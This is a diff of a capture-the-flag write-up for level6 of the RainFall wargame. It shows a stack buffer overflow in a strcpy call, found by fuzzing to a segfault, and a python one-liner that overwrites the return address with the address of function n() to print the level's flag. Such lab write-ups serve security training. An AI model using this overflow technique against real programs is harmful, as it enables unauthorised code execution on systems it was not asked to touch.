@@ -39,12 +39,25 @@ level6@RainFall:~$ ./level6  $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
 
+```
+man strcpy
 
+SECURITY CONSIDERATIONS
+     The strcpy() function is easily misused in a manner which enables mali-
+     cious users to arbitrarily change a running program's functionality
+     through a buffer overflow attack.
+```
 
+buffer argv1 is `movl   $0x40,(%esp)` = 64, we fuzz until the binary segv:
 
-
-
-
+```
+level6@RainFall:~$ ./level6 $(python -c 'print "A"*72')
+Segmentation fault (core dumped)
+```
+overflow the EIP with n() addr 0x08048454 
+```
+./level6 $(python -c 'print "A"*72 + "\x08\x04\x84\x54"[::-1]')
+```
 
 
 
